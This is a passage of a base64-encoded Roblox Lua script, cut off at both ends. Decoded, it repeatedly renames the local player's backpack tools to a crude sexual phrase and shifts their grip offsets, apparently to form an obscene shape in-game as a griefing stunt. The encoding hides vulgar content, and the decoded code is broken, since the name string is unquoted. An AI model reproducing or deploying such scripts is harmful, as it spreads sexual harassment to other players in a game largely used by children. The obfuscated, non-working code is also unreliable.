hbFBsYXllci5CYWNrcGFja1t0b29sc10uR3JpcCA9IENGcmFtZS5uZXcoLTAuNzg0MDg5ODA0LCAwLjYyMzQ1MjY2MywgMC45Mjg0NzQ0MjYsIDAuNjExNjMxNjMyLCAwLjAyMDI4MTI0MDMsIC0wLjc5MDg4MjY0NywgMC4xMDc4NjQwOTcsIDAuOTg4MTk4ODc2LCAwLjEwODc1ODIxMSwgMC43ODM3NTUxMjQsIC0wLjE1MTgyNzgxMiwgMC42MDIyMjYwMTkpICsgVmVjdG9yMy5uZXcoMCwgLTE0LjUsIC00KQogICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrW3Rvb2xzXS5OYW1lID0gQmlnIEJsYWNrIERpY2sgTG1hbwogICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrW3Rvb2xzXS5HcmlwID0gQ0ZyYW1lLm5ldygtMC43ODQwODk4MDQsIDAuNjIzNDUyNjYzLCAwLjkyODQ3NDQyNiwgMC42MTE2MzE2MzIsIDAuMDIwMjgxMjQwMywgLTAuNzkwODgyNjQ3LCAwLjEwNzg2NDA5NywgMC45ODgxOTg4NzYsIDAuMTA4NzU4MjExLCAwLjc4Mzc1NTEyNCwgLTAuMTUxODI3ODEyLCAwLjYwMjIyNjAxOSkgKyBWZWN0b3IzLm5ldygwLCAtMTUuNSwgLTQpCiAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2tbdG9vbHNdLk5hbWUgPSBCaWcgQmxhY2sgRGljayBMbWFvCiAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2tbdG9vbHNdLkdyaXAgPSBDRnJhbWUubmV3KC0wLjc4NDA4OTgwNCwgMC42MjM0NTI2NjMsIDAuOTI4NDc0NDI2LCAwLjYxMTYzMTYzMiwgMC4wMjAyODEyNDAzLCAtMC43OTA4ODI2NDcsIDAuMTA3ODY0MDk3LCAwLjk4ODE5ODg3NiwgMC4xMDg3NTgyMTEsIDAuNzgzNzU1MTI0LCAtMC4xNTE4Mjc4MTIsIDAuNjAyMjI2MDE5KSArIFZlY3RvcjMubmV3KDAsIC0xNi41LCAtNCkKICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja1t0b29sc10uTmFtZSA9IEJpZyBCbGFjayBEaWNrIExtYW8KICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja1t0b29sc10uR3JpcCA9IENGcmFtZS5uZXcoLTAuNzg0MDg5ODA0LCAwLjYyMzQ1MjY2MywgMC45Mjg0NzQ0MjYsIDAuNjExNjMxNjMyLCAwLjAyMDI4MTI0MDMsIC0wLjc5MDg4MjY0NywgMC4xMDc4NjQwOTcsIDAuOTg4MTk4ODc2LCAwLjEwODc1ODIxMSwgMC43ODM3NTUxMjQsIC0wLjE1MTgyNzgxMiwgMC42MDIyMjYwMTkpICsgVmVjdG9yMy5uZXcoMCwgLTE3LjUsIC00KQogICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrW3Rvb2xzXS5OYW1lID0gQmlnIEJsYWNrIERpY2sgTG1hbwogICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrW3Rvb2xzXS5HcmlwID0gQ0ZyYW1lLm5ldygtMC43ODQwODk4MDQsIDAuNjIzNDUyNjYzLCAwLjkyODQ3NDQyNiwgMC42MTE2MzE2MzIsIDAuMDIwMjgxMjQwMywgLTAuNzkwODgyNjQ3LCAwLjEwNzg2NDA5NywgMC45ODgxOTg4NzYsIDAuMTA4NzU4MjExLCAwLjc4Mzc1NTEyNCwgLTAuMTUxODI3ODEyLCAwLjYwMjIyNjAxOSkgKyBWZWN0b3IzLm5ldygwLCAtMTguNSwgLTQpCiAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2tbdG9vbHNdLk5hbWUgPSBCaWcgQmxhY2sgRGljayBMbWFvCiAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2tbdG9vbHNdLkdyaXAgPSBDRnJhbWUubmV3KC0wLjc4NDA4OTgwNCwgMC42MjM0NTI2NjMsIDAuOTI4NDc0NDI2LCAwLjYxMTYzMTYzMiwgMC4wMjAyODEyNDAzLCAtMC43OTA4ODI2NDcsIDAuMTA3ODY0MDk3LCAwLjk4ODE5ODg3NiwgMC4xMDg3NTgyMTEsIDAuNzgzNzU1MTI0LCAtMC4xNTE4Mjc4MTIsIDAuNjAyMjI2MDE5KSArIFZlY3RvcjMubmV3KDAsIC0xOS41LCAtNCkKICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja1t0b29sc10uTmFtZSA9IEJpZyBCbGFjayBEaWNrIExtYW8KICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja1t0b29sc10uR3JpcCA9IENGcmFtZS5uZXcoLTAuNzg0MDg5ODA0LCAwLjYyMzQ1MjY2MywgMC45Mjg0NzQ0MjYsIDAuNjExNjMxNjMyLCAwLjAyMDI4MTI0MDMsIC0wLjc5MDg4MjY0NywgMC4xMDc4NjQwOTcsIDAuOTg4MTk4ODc2LCAwLjEwODc1ODIxMSwgMC43ODM3NTUxMjQsIC0wLjE1MTgyNzgxMiwgMC42MDIyMjYwMTkpICsgVmVjdG9yMy5uZXcoMCwgLTIwLjUsIC00KQogICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrW3Rvb2xzXS5OYW1lID0gQmlnIEJsYWNrIERpY2sgTG1hbwogICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrW3Rvb2xzXS5HcmlwID0gQ0ZyYW1lLm5ldygtMC43ODQwODk4MDQsIDAuNjIzNDUyNjYzLCAwLjkyODQ3NDQyNiwgMC42MTE2MzE2MzIsIDAuMDIwMjgxMjQwMywgLTAuNzkwODgyNjQ3LCAwLjEwNzg2NDA5NywgMC45ODgxOTg4NzYsIDAuMTA4NzU4MjExLCAwLjc4Mzc1NTEyNCwgLTAuMTUxODI3ODEyLCAwLjYwMjIyNjAxOSkgKyBWZWN0b3IzLm5ldygwLCAtMjEuNSwgLTQpCiAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2tbdG9vbHNdLk5hbWUgPSBCaWcgQmxhY2sgRGljayBMbWFvCiAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2tbdG9vbHNdLkdyaXAgPSBDRnJhbWUubmV3KC0wLjc4NDA4OTgwNCwgMC42MjM0NTI2NjMsIDAuOTI4NDc0NDI2LCAwLjYxMTYzMTYzMiwgMC4wMjAyODEyNDAzLCAtMC43OTA4ODI2NDcsIDAuMTA3ODY0MDk3LCAwLjk4ODE5ODg3NiwgMC4xMDg3NTgyMTEsIDAuNzgzNzU1MTI0LCAtMC4xNTE4Mjc4MTIsIDAuNjAyMjI2MDE5KSArIFZlY3RvcjMubmV3KDAsIC0yMi41LCAtNCkKICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja1t0b29sc10uTmFtZSA9IEJpZyBCbGFjayBEaWNrIExtYW8KICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja1t0b29sc10uR3JpcCA9IENGcmFtZS5uZXcoLTAuNzg0MDg5ODA0LCAwLjYyMzQ1MjY2MywgMC45Mjg0NzQ0MjYsIDAuNjExNjMxNjMyLCAwLjAyMDI4MTI0MDMsIC0wLjc5MDg4MjY0NywgMC4xMDc4NjQwOTcsIDAuOTg4MTk4ODc2LCAwLjEwODc1ODIxMSwgMC43ODM3NTUxMjQsIC0wLjE1MTgyNzgxMiwgMC42MDIyMjYwMTkpICsgVmVjdG9yMy5uZXcoMCwgLTIzLjUsIC00KQogICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrW3Rvb2xzXS5OYW1lID0gQmlnIEJsYWNrIERpY2sgTG1hbwogICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrW3Rvb2xzXS5HcmlwID0gQ0ZyYW1lLm5ldygtMC43ODQwODk4MDQsIDAuNjIzNDUyNjYzLCAwLjkyODQ3NDQyNiwgMC42MTE2MzE2MzIsIDAuMDIwMjgxMjQwMywgLTAuNzkwODgyNjQ3LCAwLjEwNzg2NDA5NywgMC45ODgxOTg4NzYsIDAuMTA4NzU4MjExLCAwLjc4Mzc1NTEyNCwgLTAuMTUxODI3ODEyLCAwLjYwMjIyNjAxOSkgKyBWZWN0b3IzLm5ldygwLCAtMjQuNSwgLTQpCiAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2tbdG9vbHNdLk5hbWUgPSBCaWcgQmxhY2sgRGljayBMbWFvCiAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2tbdG9vbHNdLkdyaXAgPSBDRnJhbWUubmV3KC0wLjc4NDA4OTgwNCwgMC42MjM0NTI2NjMsIDAuOTI4NDc0NDI2LCAwLjYxMTYzMTYzMiwgMC4wMjAyODEyNDAzLCAtMC43OTA4ODI2NDcsIDAuMTA3ODY0MDk3LCAwLjk4ODE5ODg3NiwgMC4xMDg3NTgyMTEsIDAuNzgzNzU1MTI0LCAtMC4xNTE4Mjc4MTIsIDAuNjAyMjI2MDE5KSArIFZlY3RvcjMubmV3KDAsIC0yNS41LCAtNCkKICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja1t0b29sc10uTmFtZSA9IEJpZyBCbGFjayBEaWNrIExtYW8KICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja1t0b29sc10uR3JpcCA9IENGcmFtZS5uZXcoLTAuNzg0MDg5ODA0LCAwLjYyMzQ1MjY2MywgMC45Mjg0NzQ0MjYsIDAuNjExNjMxNjMyLCAwLjAyMDI4MTI0MDMsIC0wLjc5MDg4MjY0NywgMC4xMDc4NjQwOTcsIDAuOTg4MTk4ODc2LCAwLjEwODc1ODIxMSwgMC43ODM3NTUxMjQsIC0wLjE1MTgyNzgxMiwgMC42MDIyMjYwMTkpICsgVmVjdG9yMy5uZXcoMCwgLTI2LCAtMy41KQogICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrW3Rvb2xzXS5OYW1lID0gQmlnIEJsYWNrIERpY2sgTG1hbwogICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrW3Rvb2xzXS5HcmlwID0gQ0ZyYW1lLm5ldygtMC43ODQwODk4MDQsIDAuNjIzNDUyNjYzLCAwLjkyODQ3NDQyNiwgMC42MTE2MzE2MzIsIDAuMDIwMjgxMjQwMywgLTAuNzkwODgyNjQ3LCAwLjEwNzg2NDA5NywgMC45ODgxOTg4NzYsIDAuMTA4NzU4MjExLCAwLjc4Mzc1NTEyNCwgLTAuMTUxODI3ODEyLCAwLjYwMjIyNjAxOSkgKyBWZWN0b3IzLm5ldygwLCAtMjcsIC0yLjUpCiAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2tbdG9vbHNdLk5hbWUgPSBCaWcgQmxhY2sgRGljayBMbWFvCiAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2tbdG9vbHNdLkdyaXAgPSBDRnJhbWUubmV3KC0wLjc4NDA4OTgwNCwgMC42MjM0NTI2NjMsIDAuOTI4NDc0NDI2LCAwLjYxMTYzMTYzMiwgMC4wMjAyODEyNDAzLCAtMC43OTA4ODI2NDcsIDAuMTA3ODY0MDk3LCAwLjk4ODE5ODg3NiwgMC4xMDg3NTgyMTEsIDAuNzgzNzU1MTI0LCAtMC4xNTE4Mjc4MTIsIDAuNjAyMjI2MDE5KSArIFZlY3RvcjMubmV3KDAsIC0yNywgLTEuNSkKICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja1t0b29sc10uTmFtZSA9IEJpZyBCbGFjayBEaWNrIExtYW8KICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja1t0b29sc10uR3JpcCA9IENGcmFtZS5uZXcoLTAuNzg0MDg5ODA0LCAwLjYyMzQ1MjY2MywgMC45Mjg0NzQ0MjYsIDAuNjExNjMxNjMyLCAwLjAyMDI4MTI0MDMsIC0wLjc5MDg4MjY0NywgMC4xMDc4NjQwOTcsIDAuOTg4MTk4ODc2LCAwLjEwODc1ODIxMSwgMC43ODM3NTUxMjQsIC0wLjE1MTgyNzgxMiwgMC42MDIyMjYwMTkpICsgVmVjdG9yMy5uZXcoMCwgLTI3LCAtMS41KQogICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrW3Rvb2xzXS5OYW1lID0gQmlnIEJsYWNrIERpY2sgTG1hbwogICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrW3Rvb2xzXS5HcmlwID0gQ0ZyYW1lLm5ldygtMC43ODQwODk4MDQsIDAuNjIzNDUyNjYzLCAwLjkyODQ3NDQyNiwgMC42MTE2MzE2MzIsIDAuMDIwMjgxMjQwMywgLTAuNzkwODgyNjQ3LCAwLjEwNzg2NDA5NywgMC45ODgxOTg4NzYsIDAuMTA4NzU4MjExLCAwLjc4Mzc1NTEyNCwgLTAuMTUxODI3ODEyLCAwLjYwMjIyNjAxOSkgKyBWZWN0b3IzLm5ldygwLCAtMSwgMTApCiAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2tbdG9vbHNdLk5hbWUgPSBCaWcgQmxhY2sgRGljayBMbWFvCiAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2tbdG9vbHNdLkdyaXAgPSBDRnJhbWUubmV3KC0wLjc4NDA4OTgwNCwgMC42MjM0NTI2NjMsIDAuOTI4NDc0NDI2LCAwLjYxMTYzMTYzMiwgMC4wMjAyODEyNDAzLCAtMC43OTA4ODI2NDcsIDAuMTA3ODY0MDk3LCAwLjk4ODE5ODg3NiwgMC4xMDg3NTgyMTEsIDAuNzgzNzU1MTI0LCAtMC4xNTE4Mjc4MTIsIDAuNjAyMjI2MDE5KSArIFZlY3RvcjMubmV3KDAsIC0yLCAxMCkKICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja1t0b29sc10uTmFtZSA9IEJpZyBCbGFjayBEaWNrIExtYW8KICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja1t0b29sc10uR3JpcCA9IENGcmFtZS5uZXcoLTAuNzg0MDg5ODA0LCAwLjYyMzQ1MjY2MywgMC45Mjg0NzQ0MjYsIDAuNjExNjMxNjMyLCAwLjAyMDI4MTI0MDMsIC0wLjc5MDg4MjY0NywgMC4xMDc4NjQwOTcsIDAuOTg4MTk4ODc2LCAwLjEwODc1ODIxMSwgMC43ODM3NTUxMjQsIC0wLjE1MTgyNzgxMiwgMC42MDIyMjYwMTkpICsgVmVjdG9yMy5uZXcoMCwgLTMsIDEwKQogICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrW3Rvb2xzXS5OYW1lID0gQmlnIEJsYWNrIERpY2sgTG1hbwogICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrW3Rvb2xzXS5HcmlwID0gQ0ZyYW1lLm5ldygtMC43ODQwODk4MDQsIDAuNjIzNDUyNjYzLCAwLjkyODQ3NDQyNiwgMC42MTE2MzE2MzIsIDAuMDIwMjgxMjQwMywgLTAuNzkwODgyNjQ3LCAwLjEwNzg2NDA5NywgMC45ODgxOTg4NzYsIDAuMTA4NzU4MjExLCAwLjc4Mzc1NTEyNCwgLTAuMTUxODI3ODEyLCAwLjYwMjIyNjAxOSkgKyBWZWN0b3IzLm5ldygwLCAtNCwgMTApCiAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2tbdG9vbHNdLk5hbWUgPSBCaWcgQmxhY2sgRGljayBMbWFvCiAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2tbdG9vbHNdLkdyaXAgPSBDRnJhbWUubmV3KC0wLjc4NDA4OTgwNCwgMC42MjM0NTI2NjMsIDAuOTI4NDc0NDI2LCAwLjYxMTYzMTYzMiwgMC4wMjAyODEyNDAzLCAtMC43OTA4ODI2NDcsIDAuMTA3ODY0MDk3LCAwLjk4ODE5ODg3NiwgMC4xMDg3NTgyMTEsIDAuNzgzNzU1MTI0LCAtMC4xNTE4Mjc4MTIsIDAuNjAyMjI2MDE5KSArIFZlY3RvcjMubmV3KDAsIC01LCAxMCkKICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja1t0b29sc10uTmFtZSA9IEJpZyBCbGFjayBEaWNrIExtYW8KICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja1t0b29sc10uR3JpcCA9IENGcmFtZS5uZXcoLTAuNzg0MDg5ODA0LCAwLjYyMzQ1MjY2MywgMC45Mjg0NzQ0MjYsIDAuNjExNjMxNjMyLCAwLjAyMDI4MTI0MDMsIC0wLjc5MDg4MjY0NywgMC4xMDc4NjQwOTcsIDAuOTg4MTk4ODc2LCAwLjEwODc1ODIxMSwgMC43ODM3NTUxMjQsIC0wLjE1MTgyNzgxMiwgMC42MDIyMjYwMTkpICsgVmVjdG9yMy5uZXcoMCwgLTYsIDEwKQogICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrW3Rvb2xzXS5OYW1lID0gQmlnIEJsYWNrIERpY2sgTG1hbwogICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrW3Rvb2xzXS5HcmlwID0gQ0ZyYW1lLm5ldygtMC43ODQwODk4MDQsIDAuNjIzNDUyNjYzLCAwLjkyODQ3NDQyNiwgMC42MTE2MzE2MzIsIDAuMDIwMjgxMjQwMywgLTAuNzkwODgyNjQ3LCAwLjEwNzg2NDA5NywgMC45ODgxOTg4NzYsIDAuMTA4NzU4MjExLCAwLjc4Mzc1NTEyNCwgLTAuMTUxODI3ODEyLCAwLjYwMjIyNjAxOSkgKyBWZWN0b3IzLm5ldygwLCAtNywgMTApCiAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2tbdG9vbHNdLk5hbWUgPSBCaWcgQmxhY2sgRGljayBMbWFvCiAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2tbdG9vbHNdLkdyaXAgPSBDRnJhbWUubmV3KC0wLjc4NDA4OTgwNCwgMC42MjM0NTI2NjMsIDAuOTI4NDc0NDI2LCAwLjYxMTYzMTYzMiwgMC4wMjAyODEyNDAzLCAtMC43OTA4ODI2NDcsIDAuMTA3ODY0MDk3LCAwLjk4ODE5ODg3NiwgMC4xMDg3NTgyMTEsIDAuNzgzNzU1MTI0LCAtMC4xNTE4Mjc4MTIsIDAuNjAyMjI2MDE5KSArIFZlY3RvcjMubmV3KDAsIC04LCAxMCkKICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja1t0b29sc10uTmFtZSA9IEJpZyBCbGFjayBEaWNrIExtYW8KICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja1t0b29sc10uR3JpcCA9IENGcmFtZS5uZXcoLTAuNzg0MDg5ODA0LCAwLjYyMzQ1MjY2MywgMC45Mjg0NzQ0MjYsIDAuNjExNjMxNjMyLCAwLjAyMDI4MTI0MDMsIC0wLjc5MDg4MjY0NywgMC4xMDc4NjQwOTcsIDAuOTg4MTk4ODc2LCAwLjEwODc1ODIxMSwgMC43ODM3NTUxMjQsIC0wLjE1MTgyNzgxMiwgMC42MDIyMjYwMTkpICsgVmVjdG9yMy5uZXcoMCwgLTksIDEwKQogICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrW3Rvb2xzXS5OYW1lID0gQmlnIEJsYWNrIERpY2sgTG1hbwogICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrW3Rvb2xzXS5HcmlwID0gQ0ZyYW1lLm5ldygtMC43ODQwODk4MDQsIDAuNjIzNDUyNjYzLCAwLjkyODQ3NDQyNiwgMC42MTE2MzE2MzIsIDAuMDIwMjgxMjQwMywgLTAuNzkwODgyNjQ3LCAwLjEwNzg2NDA5NywgMC45ODgxOTg4NzYsIDAuMTA4NzU4MjExLCAwLjc4Mzc1NTEyNCwgLTAuMTUxODI3ODEyLCAwLjYwMjIyNjAxOSkgKyBWZWN0b3IzLm5ldygwLCAtMTAsIDEwKQogICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrW3Rvb2xzXS5OYW1lID0gQmlnIEJsYWNrIERpY2sgTG1hbwogICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrW3Rvb2xzXS5HcmlwID0gQ0ZyYW1lLm5ldygtMC43ODQwODk4MDQsIDAuNjIzNDUyNjYzLCAwLjkyODQ3NDQyNiwgMC42MTE2MzE2MzIsIDAuMDIwMjgxMjQwMywgLTAuNzkwODgyNjQ3LCAwLjEwNzg2NDA5NywgMC45ODgxOTg4NzYsIDAuMTA4NzU4MjExLCAwLjc4Mzc1NTEyNCwgLTAuMTUxODI3ODEyLCAwLjYwMjIyNjAxOSkgKyBWZWN0b3IzLm5ldygwLCAtMTAuNSwgOSkKICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja1t0b29sc10uTmFtZSA9IEJpZyBCbGFjayBEaWNrIExtYW8KICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja1t0b29sc10uR3JpcCA9IENGcmFtZS5uZXcoLTAuNzg0MDg5ODA0LCAwLjYyMzQ1MjY2MywgMC45Mjg0NzQ0MjYsIDAuNjExNjMxNjMyLCAwLjAyMDI4MTI0MDMsIC0wLjc5MDg4MjY0NywgMC4xMDc4NjQwOTcsIDAuOTg4MTk4ODc2LCAwLjEwODc1ODIxMSwgMC43ODM3NTUxMjQsIC0wLjE1MTgyNzgxMiwgMC42MDIyMjYwMTkpICsgVmVjdG9yMy5uZXcoMCwgLTEwLjUsIDgpCiAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2tbdG9vbHNdLk5hbWUgPSBCaWcgQmxhY2sgRGljayBMbWFvCiAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2tbdG9vbHNdLkdyaXAgPSBDRnJhbWUubmV3KC0wLjc4NDA4OTgwNCwgMC42MjM0NTI2NjMsIDAuOTI4NDc0NDI2LCAwLjYxMTYzMTYzMiwgMC4wMjAyODEyNDAzLCAtMC43OTA4ODI2NDcsIDAuMTA3ODY0MDk3LCAwLjk4ODE5ODg3NiwgMC4xMDg3NTgyMTEsIDAuNzgzNzU1MTI0LCAtMC4xNTE4Mjc4MTIsIDAuNjAyMjI2MDE5KSArIFZlY3RvcjMubmV3KDAsIC0xMC41LCA2KQogICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrW3Rvb2xzXS5OYW1lID0gQmlnIEJsYWNrIERpY2sgTG1hbwogICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrW3Rvb2xzXS5HcmlwID0gQ0ZyYW1lLm5ldygtMC43ODQwODk4MDQsIDAuNjIzNDUyNjYzLCAwLjkyODQ3NDQyNiwgMC42MTE2MzE2MzIsIDAuMDIwMjgxMjQwMywgLTAuNzkwODgyNjQ3LCAwLjEwNzg2NDA5NywgMC45ODgxOTg4NzYsIDAuMTA4NzU4MjExLCAwLjc4Mzc1NTEyNCwgLTAuMTUxODI3ODEyLCAwLjYwMjIyNjAxOSkgKyBWZWN0b3IzLm5ldygwLCAtMTAsIDUpCiAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2tbdG9vbHNdLk5hbWUgPSBCaWcgQmxhY2sgRGljayBMbWFvCiAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2tbdG9vbHNdLkdyaXAgPSBDRnJhbWUubmV3KC0wLjc4NDA4OTgwNCwgMC42MjM0NTI2NjMsIDAuOTI4NDc0NDI2LCAwLjYxMTYzMTYzMiwgMC4wMjAyODEyNDAzLCAtMC43OTA4ODI2NDcsIDAuMTA3ODY0MDk3LCAwLjk4ODE5ODg3NiwgMC4xMDg3NTgyMTEsIDAuNzgzNzU1MTI0LCAtMC4xNTE4Mjc4MTIsIDAuNjAyMjI2MDE5KSArIFZlY3RvcjMubmV3KDAsIC0xMC41LCA0KQogICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrW3Rvb2xzXS5OYW1lID0gQmlnIEJsYWNrIERpY2sgTG1hbwogICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrW3Rvb2xzXS5HcmlwID0gQ0ZyYW1lLm5ldygtMC43ODQwODk4MDQsIDAuNjIzNDUyNjYzLCAwLjkyODQ3NDQyNiwgMC42MTE2MzE2MzIsIDAuMDIwMjgxMjQwMywgLTAuNzkwODgyNjQ3LCAwLjEwNzg2NDA5NywgMC45ODgxOTg4NzYsIDAuMTA4NzU4MjExLCAwLjc4Mzc1NTEyNCwgLTAuMTUxODI3ODEyLCAwLjYwMjIyNjAxOSkgKyBWZWN0b3IzLm5ldygwLCAtMTEuNSwgNCkKICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja1t0b29sc10uTmFtZSA9IEJpZyBCbGFjayBEaWNrIExtYW8KICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja1t0b29sc10uR3JpcCA9IENGcmFtZS5uZXcoLTAuNzg0MDg5ODA0LCAwLjYyMzQ1MjY2MywgMC45Mjg0NzQ0MjYsIDAuNjExNjMxNjMyLCAwLjAyMDI4MTI0MDMsIC0wLjc5MDg4MjY0NywgMC4xMDc4NjQwOTcsIDAuOTg4MTk4ODc2LCAwLjEwODc1ODIxMSwgMC43ODM3NTUxMjQsIC0wLjE1MTgyNzgxMiwgMC42MDIyMjYwMTkpICsgVmVjdG9yMy5uZXcoMCwgLTEyLjUsIDQpCiAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2tbdG9vbHNdLk5hbWUgPSBCaWcgQmxhY2sgRGljayBMbWFvCiAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2tbdG9vbHNdLkdyaXAgPSBDRnJhbWUubmV3KC0wLjc4NDA4OTgwNCwgMC42MjM0NTI2NjMsIDAuOTI4NDc0NDI2LCAwLjYxMTYzMTYzMiwgMC4wMjAyODEyNDAzLCAtMC43OTA4ODI2NDcsIDAuMTA3ODY0MDk3LCAwLjk4ODE5ODg3NiwgMC4xMDg3NTgyMTEsIDAuNzgzNzU1MTI0LCAtMC4xNTE4Mjc4MTIsIDAuNjAyMjI2MDE5KSArIFZlY3RvcjMubmV3KDAsIC0xMy41LCA0KQogICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrW3Rvb2xzXS5OYW1lID0gQmlnIEJsYWNrIERpY2sgTG1hbwogICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrW3Rvb2xzXS5HcmlwID0gQ0ZyYW1lLm5ldygtMC43ODQwODk4MDQsIDAuNjIzNDUyNjYzLCAwLjkyODQ3NDQyNiwgMC42MTE2